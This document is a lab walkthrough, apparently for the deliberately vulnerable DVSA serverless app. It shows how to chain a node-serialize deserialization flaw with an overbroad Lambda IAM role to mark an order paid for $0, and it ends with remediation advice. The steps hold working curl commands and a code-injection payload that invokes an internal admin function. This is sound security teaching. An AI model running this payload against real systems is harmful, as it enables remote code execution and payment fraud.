
In this scenario, we chain an insecure deserialization flaw with an overpermissive IAM role to bypass the payment gateway and mark an order as "paid" for $0.

---

# Lesson 5: Broken Access Control & Administrative Injection

## 1. Overview
The `DVSA-ORDER-MANAGER` Lambda role is configured with excessive permissions, allowing it to invoke **any** Lambda function in the AWS account. By leveraging the insecure deserialization vulnerability found in Lesson 1, we can force the Order Manager to execute a custom script that calls an internal administrative function (`DVSA-ADMIN-UPDATE-ORDERS`), effectively bypassing the intended business logic and authorization checks.

### Vulnerability Chain
1.  **Insecure Deserialization:** The application uses `node-serialize`, allowing us to inject and execute arbitrary JavaScript code via the `_$$ND_FUNC$$_` prefix.
2.  **Overpermissive IAM Role:** The Lambda's execution role has `lambda:InvokeFunction` permission on `Resource: "*"`.
3.  **Missing Authorization:** The admin function assumes that if it is being called, the caller must be authorized.

---

## 2. Reproduction Steps

### Prerequisites
* Ensure you have your environment variable `$TOKEN` set with a valid authentication token.
* The target API Gateway URL should be identified.

### Step 1: Initialize a New Order
First, we create a standard order to generate a unique `order-id`.

```bash
curl -X POST https://ffs37upabg.execute-api.us-east-1.amazonaws.com/dvsa/order \
  -H "Content-Type: application/json" \
  -H "Authorization: $TOKEN" \
  -d '{"action":"new","cart-id":"03fd26de-3ae3-414f-be05-ae1fd75add68","items":{"1018":1}}'
```

****

> **Note:** Copy the `order-id` from the JSON response (e.g., `f478f4b5-d612-4ea4-a690-a93869becc5`). You will need this for the exploit.

---

### Step 2: Add Shipping Details
Update the order with shipping information to move it to the next state in the workflow.

```bash
curl -X POST https://ffs37upabg.execute-api.us-east-1.amazonaws.com/dvsa/order \
  -H "Content-Type: application/json" \
  -H "Authorization: $TOKEN" \
  -d '{"action":"shipping","order-id":"YOUR_ORDER_ID_HERE","data":{"address":"Academic Belt Road","email":"hacker@example.com","name":"hacker"}}'
```

---

### Step 3: Execute the Exploit (Payment Bypass)
Instead of proceeding to the payment page, we send a malicious payload. This payload uses the `node-serialize` exploit to instantiate an AWS Lambda client *inside* the server and manually invoke the `DVSA-ADMIN-UPDATE-ORDERS` function.

**The Exploit Logic:**
* **Total:** Set to `0`.
* **Status:** Set to `120` (which the system interprets as "Paid").
* **Token:** `faketoken123`.

**Run the following command:**

```bash
curl -X POST https://ffs37upabg.execute-api.us-east-1.amazonaws.com/dvsa/order \
  -H "Content-Type: application/json" \
  -H "Authorization: $TOKEN" \
  -d '{
  "action": "_$$ND_FUNC$$_function(){const {LambdaClient,InvokeCommand}=require(\"@aws-sdk/client-lambda\");const c=new LambdaClient({region:\"us-east-1\"});const payload={\"headers\":{\"authorization\":\"$TOKEN\"},\"body\":{\"action\":\"update\",\"order-id\":\"YOUR_ORDER_ID_HERE\",\"item\":{\"token\":\"faketoken123\",\"ts\":1775993000,\"itemList\":{\"1018\":1},\"address\":\"Academic Belt Road\",\"total\":0,\"status\":120}}};const cmd=new InvokeCommand({FunctionName:\"DVSA-ADMIN-UPDATE-ORDERS\",InvocationType:\"RequestResponse\",Payload:Buffer.from(JSON.stringify(payload))});c.send(cmd).then(d=>{});return \"orders\";}()",
  "cart-id": ""
}'
```

****

---

### Step 4: Verify the Results
Finally, check the status of your orders. You should see that the order is now marked as **"paid"** despite no actual transaction occurring.

```bash
curl -s -X POST https://ffs37upabg.execute-api.us-east-1.amazonaws.com/dvsa/order \
  -H "Content-Type: application/json" \
  -H "Authorization: $TOKEN" \
  -d '{"action":"list"}' | jq
```

****

---

## 3. Remediation Strategy

To secure this workflow, we must address the vulnerability at three different layers:

### Layer 1: Code (Input Validation)
Replace the dangerous `node-serialize` library with standard `JSON.parse()`. This prevents the execution of arbitrary JavaScript objects.

### Layer 2: Infrastructure (Least Privilege)
Restrict the IAM role of the `OrderManager` function. Instead of allowing it to call any function (`Resource: "*"`), limit it specifically to the functions it needs to operate.

```json
{
  "Effect": "Allow",
  "Action": "lambda:InvokeFunction",
  "Resource": [
    "arn:aws:lambda:us-east-1:*:function:DVSA-ORDER-*",
    "arn:aws:lambda:us-east-1:*:function:DVSA-USER-*"
  ]
}
```

### Layer 3: Application Logic (Authorization)
The administrative function `DVSA-ADMIN-UPDATE-ORDERS` must independently verify that the requester has administrative privileges before performing any updates. Never trust a request simply because it reached an internal endpoint.
